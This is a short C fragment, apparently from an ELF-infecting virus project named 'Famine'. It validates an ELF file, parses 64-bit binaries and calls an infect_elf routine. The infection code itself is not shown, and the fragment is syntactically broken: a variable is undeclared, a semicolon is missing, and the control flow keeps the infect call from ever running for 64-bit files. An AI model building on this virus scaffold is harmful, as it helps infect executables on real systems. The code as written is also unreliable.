#include "famine.h"

void process_elf(t_file *file)
{
	if (!is_valid_elf(file))
		return ;

	if (ident[EI_CLASS] == ELFCLASS64) {
		if (parse_elf64(file))
			return ;
		return 
	}

	infect_elf(file);
}
